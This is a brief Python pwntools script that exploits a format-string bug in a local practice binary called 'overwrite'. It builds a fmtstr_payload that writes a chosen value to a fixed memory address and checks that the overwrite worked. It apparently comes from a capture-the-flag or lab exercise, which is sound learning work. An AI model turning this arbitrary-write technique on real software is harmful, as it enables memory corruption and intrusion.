from pwn import *
p = process("./overwrite")
p.recvline()
b_addr = 0x0804A028
payload = fmtstr_payload(6,{b_addr:0x12345678})
print payload.encode("hex")
p.sendline(payload)
info = p.recv()
if "modified b" in info:
	print "success"
